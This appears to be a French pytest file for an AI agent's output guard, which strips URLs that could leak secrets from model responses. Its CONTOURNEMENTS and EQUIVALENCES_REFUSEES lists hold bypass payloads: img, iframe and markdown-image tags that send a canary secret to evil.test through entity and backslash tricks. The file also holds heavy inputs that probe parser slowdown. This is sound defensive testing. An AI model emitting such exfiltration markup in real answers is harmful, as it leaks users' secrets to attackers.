"""La garde de la réponse : contournements et faux positifs de la nuit du 11 nov. 2026.

Trouvés par l'agent attaquant (Chrome headless + serveur local qui journalise les requêtes),
`.context/nuit-2026-11-11/attaque.md` :

1. entité numérique SANS point-virgule (`&#104ttp://`) : HTML5 la décode, la garde non ;
2. `/\\hôte`, `\\/hôte`, `\\\\hôte` : le navigateur lit `\\` comme `/`, la garde ne voyait pas une URL ;
3. définition de référence dont la destination est sur la LIGNE SUIVANTE (CommonMark l'accepte) ;
4. `<a` + n espaces : temps cubique dans `_BALISE` (0,64 s pour 800 espaces) ;
5. 6 réponses légitimes sur 12 perdaient une URL fiable (`&amp;`, slash final, casse de l'hôte,
   http/https, deux URL collées par une virgule, `mailto:` d'une adresse donnée par l'utilisateur).
"""

from __future__ import annotations

import time

import pytest

from autoagent.output_guard import OutputGuard, guard_output
from autoagent.schema import UNTRUSTED_OPEN, Message

SECRET = "CANARY-0123456789ab"
DOC = "https://docs.alyce.test/guide?a=1&b=2"


def _transcript(user: str = "Résume.", page: str = "rien", fiable: str | None = None) -> list[Message]:
    messages = [
        Message(role="system", content="Tu es un assistant."),
        Message(role="user", content=f"Le code est {SECRET}. {user}"),
        Message(role="tool", name="lire_page", content=f"{UNTRUSTED_OPEN}\n{{\"result\": \"{page}\"}}"),
    ]
    if fiable is not None:
        messages.append(Message(role="tool", name="fiche", content=fiable))
    return messages


def _garder(texte: str, **kw: str) -> str:
    return guard_output(texte, _transcript(**kw))[0]


CONTOURNEMENTS = [
    ("entite sans point-virgule, img", f'<img src="&#104ttp://evil.test/p.png?d={SECRET}">'),
    ("entite sans point-virgule, object", f'<object data="&#104ttp://evil.test/?d={SECRET}"></object>'),
    ("entite sans point-virgule, iframe", f'<iframe src="&#104ttp://evil.test/?d={SECRET}"></iframe>'),
    ("entite hexa sans point-virgule", f'<img src="&#x68ttp://evil.test/p.png?d={SECRET}">'),
    ("entite avec zeros de tete", f'<img src="&#0000104;ttp://evil.test/p.png?d={SECRET}">'),
    ("slash puis antislash", f'<img src="/\\evil.test/p.png?d={SECRET}">'),
    ("antislash puis slash", f'<img src="\\/evil.test/p.png?d={SECRET}">'),
    ("deux antislashs", f'<img src="\\\\evil.test/p.png?d={SECRET}">'),
    ("hote sans point", f'<img src="/\\evil:8099/p.png?d={SECRET}">'),
    ("link preload", f'<link rel="preload" as="image" href="/\\evil.test/p.png?d={SECRET}">'),
    ("schema avec antislashs", f'<img src="https:\\\\evil.test/p.png?d={SECRET}">'),
    ("tabulation dans l'url", f'<img src="/\t/evil.test/p.png?d={SECRET}">'),
    ("balise sans espace", f'<img/src="//evil.test/p.png?d={SECRET}">'),
    ("image markdown, antislash", f"![x](/\\evil.test/p.png?d={SECRET})"),
]


@pytest.mark.parametrize("nom,texte", CONTOURNEMENTS, ids=[c[0] for c in CONTOURNEMENTS])
def test_contournement_neutralise(nom: str, texte: str) -> None:
    sortie, trouvailles = guard_output(texte, _transcript())
    assert SECRET not in sortie, f"{nom} : {sortie!r}"
    assert "evil" not in sortie and trouvailles


def test_reference_dont_la_destination_est_a_la_ligne() -> None:
    page = "voir https://evil.test/pixel.png"
    texte = "![x][a]\n\n[a]:\n  https://evil.test/pixel.png"
    sortie = _garder(texte, page=page)
    assert "evil.test" not in sortie, "une image n'est gardée que si son URL est FIABLE"


def test_reference_de_lien_a_la_ligne_citee_par_la_page_reste_un_lien() -> None:
    page = "source https://source.test/article"
    sortie = _garder("[src][a]\n\n[a]:\n  https://source.test/article", page=page)
    assert "https://source.test/article" in sortie


@pytest.mark.parametrize("n", [800, 20_000])
def test_balise_ouverte_sans_fin_en_temps_lineaire(n: int) -> None:
    for texte in ("<a" + " " * n + "x", ("<a " * n), "<a" + " " * n + "=" * n):
        debut = time.perf_counter()
        guard_output(texte, _transcript())
        assert time.perf_counter() - debut < 0.5, (n, texte[:10])


CHARGES_LOURDES = {
    "definitions nombreuses": "".join(f"[id{i}]: https://evil.test/{i}\n" for i in range(6000)) + "![x][id1]" * 6000,
    "points": "a." * 100_000,
    "barres": "/" * 100_000 + "x",
    "ponctuation finale": "https://evil.test/x" + ")" * 100_000,
    "courriel sans arobase": "a" * 100_000,
    "entites sans point-virgule": "&#" * 100_000,
}


@pytest.mark.parametrize("nom", list(CHARGES_LOURDES))
def test_charges_lourdes_en_temps_borne(nom: str) -> None:
    transcript = _transcript(user="a." * 50_000 + " " + "b" * 50_000)   # le transcript aussi est lu
    debut = time.perf_counter()
    guard_output(CHARGES_LOURDES[nom], transcript)
    assert time.perf_counter() - debut < 2.0, nom


def test_reference_d_image_reconnue_quelle_que_soit_la_casse_et_les_blancs() -> None:
    texte = "![x][Mon  Logo]\n\n[mon logo]: https://evil.test/p.png"
    assert "evil" not in _garder(texte, page="https://evil.test/p.png")


LEGITIMES = [
    ("&amp; au lieu de &", "Voir [guide](https://docs.alyce.test/guide?a=1&amp;b=2).", {"user": f"Doc : {DOC}"},
     "docs.alyce.test/guide"),
    ("slash final ajoute", "Site : https://docs.alyce.test/", {"user": "Mon site https://docs.alyce.test"},
     "docs.alyce.test/"),
    ("casse de l'hote", "Site : https://Docs.Alyce.test/guide", {"user": "Mon site https://docs.alyce.test/guide"},
     "Docs.Alyce.test"),
    ("https au lieu de http", "Doc : https://docs.alyce.test/guide", {"user": "Doc http://docs.alyce.test/guide"},
     "https://docs"),
    ("deux URL fiables collees", "Docs : https://docs.alyce.test/a,https://docs.alyce.test/b",
     {"user": "Docs https://docs.alyce.test/a et https://docs.alyce.test/b"}, "docs.alyce.test/b"),
    ("mailto d'une adresse donnee", "Écrire à [nous](mailto:contact@alyce.test)", {"user": "Contact: contact@alyce.test"},
     "mailto:contact@alyce.test"),
    ("image fiable d'un outil, casse", "![p](https://CDN.alyce.test/a/b.png)", {"fiable": "https://cdn.alyce.test/a/b.png"},
     "a/b.png"),
]


@pytest.mark.parametrize("nom,texte,kw,marque", LEGITIMES, ids=[c[0] for c in LEGITIMES])
def test_url_fiable_gardee(nom: str, texte: str, kw: dict, marque: str) -> None:
    assert marque in _garder(texte, **kw), nom


EQUIVALENCES_REFUSEES = [
    ("mailto avec corps", f"[x](mailto:contact@alyce.test?body={SECRET})", {"user": "Contact: contact@alyce.test"}),
    ("autre chemin du meme hote", f"![x](https://docs.alyce.test/{SECRET}.png)", {"user": f"Doc {DOC}"}),
    ("requete ajoutee", f"![x](https://docs.alyce.test/guide?d={SECRET})", {"user": "Doc https://docs.alyce.test/guide"}),
    ("identifiants dans l'url", f"![x](https://{SECRET}@docs.alyce.test/guide)", {"user": "Doc https://docs.alyce.test/guide"}),
    ("une URL fiable collee a une URL d'attaque", f"https://docs.alyce.test/a,https://evil.test/?d={SECRET}",
     {"user": "Docs https://docs.alyce.test/a"}),
    ("casse du chemin", "![x](https://docs.alyce.test/GUIDE)", {"user": "Doc https://docs.alyce.test/guide"}),
]


@pytest.mark.parametrize("nom,texte,kw", EQUIVALENCES_REFUSEES, ids=[c[0] for c in EQUIVALENCES_REFUSEES])
def test_la_normalisation_n_ouvre_rien(nom: str, texte: str, kw: dict) -> None:
    sortie, trouvailles = guard_output(texte, _transcript(**kw))
    assert trouvailles, nom
    assert SECRET not in sortie and "GUIDE" not in sortie and "evil" not in sortie


def test_l_image_reste_refusee_si_seule_la_page_la_cite_meme_normalisee() -> None:
    page = "https://evil.test/p.png"
    assert "evil" not in _garder("![x](https://EVIL.test/p.png/)", page=page)


def test_idempotente_sur_les_nouvelles_formes() -> None:
    for _, texte in CONTOURNEMENTS:
        une = guard_output(texte, _transcript())[0]
        deux, trouvailles = guard_output(une, _transcript())
        assert deux == une and not trouvailles
